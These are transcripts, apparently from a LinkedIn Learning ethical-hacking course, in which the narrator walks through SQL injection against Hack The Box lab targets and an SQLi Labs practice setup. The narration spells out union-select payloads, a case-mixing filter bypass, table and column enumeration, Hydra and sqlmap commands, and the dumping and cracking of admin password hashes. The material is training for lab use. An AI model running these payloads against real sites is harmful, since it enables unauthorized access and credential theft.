> **[0:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=6)** This is the Charon server, and if you want to feel a hands-on with this, you'll need to be in the Hack The Box lab.
>
> **[0:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=11)** Connecting to the site shows what looks like a food-focused website, with a blog.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=16)** There's no particular areas of interest on the site, but when we carry out our reconnaissance, we find there's a number of additional pages including the CMS data login page.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=26)** Let's go and take a look at that, /cmsdata/login.php.
>
> **[0:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=36)** We've got a login page here.
>
> **[0:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=38)** I won't go through the whole process.
>
> **[0:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=40)** But it turns out that this page isn't susceptible to SQL injection.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=44)** Next, we'll go to the forgot password page.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=47)** Okay, now we can start to test the page.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=50)** First, let's see what it does with a random email, a@[b.com](https://b.com).
>
> **[0:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=59)** Okay. That gives an email not found, which we'd expect.
>
> **[1:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=63)** Now let's try something we know will have an error, if it's passed to the database, a@[b.com](https://b.com), quote.
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=71)** Okay, we get a database error.
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=73)** This means we can get through to the database with an SQL injection.
>
> **[1:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=77)** Let's see if we can do a blind SQL attack by using, order by, to check the number of columns, a@[b.com](https://b.com), order by one, and we don't get an error, so let's keep trying.
>
> **[1:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=99)** A@[b.com](https://b.com), Order by two.
>
> **[1:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=112)** A@[b.com](https://b.com), order by three.
>
> **[2:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=124)** A@[b.com](https://b.com), order by four.
>
> **[2:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=135)** A@[b.com](https://b.com), order by five.
>
> **[2:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=146)** And we have an error in the database.
>
> **[2:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=148)** So, we now know we have four columns, now, let's try to inject via a union, A@[b.com](https://b.com), union select one, two, three, four and we'll send.
>
> **[2:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=167)** We get a response from the system in a new page saying, there's an error here.
>
> **[2:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=170)** Okay, there's something strange going on.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=172)** One thing we need to be aware of is that the system may be looking for standard injection codes, such as union select.
>
> **[2:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=179)** So, let's modify this a bit.
>
> **[3:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=181)** After a few tries, we find we get an incorrect format error if we have mixed case.
>
> **[3:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=188)** Union Select.
>
> **[3:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=194)** Okay, we can see the message indicates that we're not providing the correct format.
>
> **[3:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=198)** Given we have an email addresses input, perhaps one of the columns needs to be in that format also.
>
> **[3:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=203)** With a bit of trial and error, we find that it's the fourth column, a@[b.com](https://b.com), union select, one, comma, two, comma, three, comma, a@b.c, a@[b.com](https://b.com), Union Select one, two, three, a@b.c.
>
> **[3:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=234)** And we get a valid response from the system saying this, in email, has been sent from parameter four to parameter two.
>
> **[4:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=240)** We have to keep column four as email address, but let's try replacing column two, with our user function.
>
> **[4:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=246)** A@b.c, union select One, comma, user, comma, three, comma, a@b.c.
>
> **[4:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=270)** Okay. Now let's try getting the database, a@[b.com](https://b.com), union select, one, comma, database, comma, three, comma, a@b.c and we're using this super CMS database.
>
> **[4:57](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=297)** So, now we're getting data out of the system.
>
> **[4:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=299)** When we try to display the tables using, a@[b.com](https://b.com), Union select, one, comma, table name, comma, three, comma, a@b.c from information schema dot tables, we get an error with user not found with that email.
>
> **[5:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=336)** We can postulate that one reason for this might be that we're returning too many table lines, and we need to limit it to just one at a time.
>
> **[5:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=343)** So let's try that.
>
> **[5:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=344)** A@[b.com](https://b.com) union select, one, comma, table name, comma, three, comma, a@b.c, from information schema dot tables, limit naught, comma, one.
>
> **[6:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=374)** Okay. We'll have the first table name character sets.
>
> **[6:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=377)** We can now start incrementing the starting row, and list the tables.
>
> **[6:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=381)** It's a long slug through enumerating the database.
>
> **[6:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=384)** However, after enumerating all the tables, we find, a@[b.com](https://b.com), union select, one, comma, table name, comma, three, comma a@b.c from information schema dot tables, limit 63, comma, one, but we do find an operator's table.
>
> **[7:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=422)** We can now take a look at the columns in the table using a similar technique.
>
> **[7:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=426)** A@[b.com](https://b.com), union select, one, comma, column name, comma, three, comma, a@b.c from information schema dot columns, where, table name equal operators, limit zero, comma, one.
>
> **[7:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=468)** And we have an ID similarly, a@[b.com](https://b.com), union select one, comma, column name, comma, three, comma, a@b.c from information schema dot columns, where table name equals operators, limit one, comma, one.
>
> **[8:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=512)** And we get underscore, underscore, username, underscore, underscore.
>
> **[8:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=517)** And if we did that again for a limit of two, comma, one, we'd get underscore, underscore, username, underscore.
>
> **[8:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=523)** So let's now extract them.
>
> **[8:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=525)** A@[b.com](https://b.com), union select, one, comma, underscore, underscore, password, underscore, comma three, comma and we'll concat.
>
> **[9:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=544)** To concatenate, underscore, underscore user name, underscore, comma at @b.c From operators limit, naught, comma, one.
>
> **[9:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=570)** So, that's a@[b.com](https://b.com), quotes, union select, one, comma, underscore, underscore, password, underscore, three, comma, concat, underscore, underscore, username, underscore, comma, quote @b.c, end bracket from operators, limit naught, not one.
>
> **[9:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=594)** And we get test one and a hash, and we can repeat that, with the changing limit, to get all the usernames out.
>
> **[10:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=603)** And we find when we do that, we eventually get to, a@[b.com](https://b.com), union select, one, comma, underscore, underscore, password, underscore, comma, three, comma, concat, underscore, underscore, username, underscore, comma @b.c from operators limit 200, comma, one, 200 comma, one.
>
> **[10:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=640)** And we find that gives us our super CMS admin user hash.
>
> **[10:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=647)** If we take that hash and go into crack station, paste it, and we have the password tomorrow.
>
> **[11:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=660)** We can now log into the system.
>
> **[11:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=663)** Super, underscore, CMS, underscore, Adam and tomorrow.
>
> **[11:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=674)** We've successfully carried out the SQL injection to gain access to the administrator's password.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** database (8), cms (4), [[SQL]] (4), data (2), [[PHP]] (1)
> **URLs:** [b.com](https://b.com) (19)
> **File Paths:** b.c (13), cmsdata/login.php (1)
> **CLI Commands:** find (7), php (1)
> **Env Vars:** cms (4), sql (4)
> **Versions:** 10.10.10 (1)
> **UI Navigation:** go to (1)
> **Analogies:** such as (1)

#### Using request messages to inject SQL
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=0)** - [Narrator] Let's try another of the Hack The Box targets.
>
> **[0:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=3)** This one is called Falafel on 10.10.10.73, and it's a falafel lovers website.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=10)** There's a login page, so let's try that.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=13)** And let's try.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=15)** (computer keyboard clattering) Admin, admin, and we get wrong identification.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=22)** Let's try.
>
> **[0:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=23)** (computer keyboard clattering) Guest, guest.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=30)** And we get, try again.
>
> **[0:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=32)** After some experimentation it seems that our guesses for username all get the try again message, except for admin.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=39)** We can now assume admin is a valid user.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=41)** We don't have any passwords currently, but let's see if we can find any additional users.
>
> **[0:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=46)** We can use Hydra for this.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=47)** I checked the form to see that the two form fields are username and password.
>
> **[0:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=52)** We'll use Hydra with pass123 as the password.
>
> **[0:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=55)** We're not trying to get a valid password, just identify users.
>
> **[0:59](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=59)** (computer keyboard clattering) Minus P. (computer keyboard clattering) Pass123, just to fix password, but we'll use the, list, file, user, share, word lists, rockyou.txt.
>
> **[1:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=79)** We're going to go to 10.10.10.73.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=84)** It's going to be an http. (computer keyboard clattering) Post-form and it's /login.php,
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=96)** colon, username equals, caret, USER, for the user from the file and,
>
> **[1:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=110)** password equals, affixed caret, pass.
>
> **[1:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=116)** And what we're looking for, is a failing message is try again.
>
> **[2:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=124)** Okay.
>
> **[2:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=128)** Okay, we've quickly found that Chris is a valid username.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=132)** We could now try Hydra with Chris and try and crack its password.
>
> **[2:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=137)** But in fact, when we do that, we don't find it.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=139)** So let's leave it and see what we can do with an SQL injection.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=145)** Let's start Burp Suite.
>
> **[2:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=149)** (computer mouse clicking) Let's turn off interception. (computer mouse clicking) And we'll add to our scope, 10.10.10.73.
>
> **[2:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=167)** Okay.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=168)** (computer mouse clicking) Okay, we'll set our browser preferences, network settings to manual proxy.
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=182)** Okay.
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=185)** And now let's put in the username Chris and submit.
>
> **[3:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=192)** And we get, wrong identification.
>
> **[3:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=194)** Let's go to the post message with username as Chris.
>
> **[3:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=201)** And let's copy it.
>
> **[3:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=206)** To file, and we'll make the file, Chris.txt.
>
> **[3:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=215)** (computer mouse clicks) Now we can run our SQL map command using the request packet and the value, wrong identification, which indicates a valid response on username.
>
> **[3:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=227)** SQL map minus r, chris.txt minus, minus string, wrong identification.
>
> **[4:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=242)** (computer keyboard clattering) Okay, we found an injection.
>
> **[4:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=249)** We can now run this with the minus, minus DBS switch to get the databases.
>
> **[4:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=254)** Minus, minus DBS.
>
> **[4:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=259)** And we can see we're retrieving the database names with a blind based timing transaction.
>
> **[4:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=267)** Okay.
>
> **[4:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=268)** We've recovered two tables, falafel and information_schema.
>
> **[4:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=272)** Let's look at the tables in falafel.
>
> **[4:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=275)** (computer keyboard clattering) It's D falafel, minus, minus tables. (computer mouse clicks) And we find the user's table.
>
> **[4:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=288)** Okay, let's dump it.
>
> **[4:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=290)** (computer mouse clicking) Minus T, users and dump.
>
> **[4:57](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=297)** Okay, we've found admin and Chris together with their hashes.
>
> **[5:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=302)** And when we use CrackStation, we find Chris's password is Juggling.
>
> **[5:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=307)** And as a post script, our initial Hydra scan also found a username, Sleepy.
>
> **[5:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=313)** (computer mouse clicking) And when we use Sleepy, a hacking attempt is detected.
>
> **[5:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=321)** I guess this was the honey pot account.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (3), [[Microsoft Word|Word]] (1), [[PHP]] (1), [[Burp Suite]] (1), [[Databases]] (1)
> **CLI Commands:** find (4), php (1), make (1)
> **Env Vars:** sql (3), dbs (2), user (1)
> **Non-Speech:** (computer mouse clicking) (5)
> **File Paths:** chris.txt (2), rockyou.txt (1), login.php (1)
> **Definitions:** is a  (3), is called (1)
> **Versions:** 10.10.10 (3)
> **UI Navigation:** go to (2)

#### Checking out SQLI Labs
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=0)** - [Instructor] Before we finish the course, you may want to set up your own SQL injection lab to deep-dive more advanced SQL injections.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=8)** There's an interesting set of PHP files which can be used to practice SQL injections, known as the SQLI labs.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=15)** These have been created by a user called Audi-1.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=18)** And while the presentation is a bit juvenile, they can be quite useful as a test bed.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=22)** We'll need to install the latest php7 version of the labs, which we can get from the skyblueee site shown here.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=30)** Okay, let's install the files.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=33)** I'm in my var/www/html folder and I'll sudo git clone [https://github.com/skyblueee/sqli-labs-php7.git](https://github.com/skyblueee/sqli-labs-php7.git).
>
> **[1:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=64)** And I'll change the folder name to SQLI for ease of use.
>
> **[1:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=68)** Sudo mv sqli-labs-php7 sqli.
>
> **[1:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=82)** We can now start Apache and MySQL.
>
> **[1:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=87)** Service apache2 start && service mysql start.
>
> **[1:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=101)** We need to set up a user account for the lab.
>
> **[1:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=103)** Let's do that.
>
> **[1:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=104)** Sudo mysql -u root, and we'll create user 'sqliuser'@;localhost'
>
> **[2:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=123)** identified by 'sqluser';,
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=132)** and we'll grant all privileges on *.*
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=144)** to 'sqliuser'@'localhost;.
>
> **[2:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=156)** Okay.
>
> **[2:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=157)** We can now update the SQLI lab connection, cd sqli, and we need to go into sql-connections.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=172)** And sudo nano db-creds.inc.
>
> **[3:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=181)** Change our dbuser to 'sqliuser,'
>
> **[3:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=190)** and the db password to 'sqliuser.'
>
> **[3:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=196)** Okay, we can now go into the website, 127.0.0.1/sqli.
>
> **[3:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=204)** And we can set up, reset the database for the labs.
>
> **[3:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=208)** Okay.
>
> **[3:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=209)** That's set up.
>
> **[3:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=211)** There are over 60 exercises in total across four pages of basic, advanced, stacked and challenges.
>
> **[3:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=217)** And if we scroll down, we'll see the different types of exercises that we can run.
>
> **[3:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=224)** Let's start the first exercise, which is to input the ID as parameter with a numeric value.
>
> **[3:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=232)** And we'll do that as id=1.
>
> **[3:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=238)** And we get the user details for ID one.
>
> **[4:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=243)** We can do the same thing with ID two.
>
> **[4:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=246)** We get another set of details and we can put in id=3 and we get some more details.
>
> **[4:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=254)** Let's go back now to lesson two.
>
> **[4:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=259)** We've got the same lesson, but let's add a quote to see what happens.
>
> **[4:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=264)** 'id=1', and we have an error in the SQL syntax.
>
> **[4:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=274)** Okay, let's add an inject.
>
> **[4:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=276)** So we'll make that equals one or one equals one.
>
> **[4:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=285)** And that works.
>
> **[4:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=286)** So now let's try equals one, order by one.
>
> **[4:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=296)** And that works.
>
> **[5:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=301)** Order by two, and that works.
>
> **[5:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=308)** And order by three, and that works.
>
> **[5:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=312)** When we try order by four, we have an unknown column.
>
> **[5:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=318)** So we now know that we have three columns in the selection.
>
> **[5:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=322)** So let's start to extract information.
>
> **[5:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=326)** We'll set id=0 and do a union select,
>
> **[5:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=334)** and we'll select NULL, user and database.
>
> **[5:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=344)** And we've started to extract information.
>
> **[5:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=347)** This lab provides the basis of a useful tool for trying out your SQL injections.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (6), [[MySQL]] (3), [[Git]] (2), database (2), [[PHP]] (1)
> **CLI Commands:** sudo (4), mysql (3), git (2), php (1), mv (1)
> **Env Vars:** sql (5), sqli (3), php (1), null (1)
> **Prerequisites:** set up (4), install (2)
> **Definitions:** known as (1), is a  (1)
> **URLs:** [https://github.com/skyblueee/sqli-labs-php7.git](https://github.com/skyblueee/sqli-labs-php7.git) (1)
> **Versions:** 127.0.0 (1)
> **Tools:** github (1)


### Conclusion

[↑ Back to Table of Contents](#table-of-contents)

#### What's next?
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=0)** - [Malcolm] I'd really like to thank you for joining me for this course.
>
> **[0:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=3)** I hope you enjoyed learning about how to run SQL injections.
>
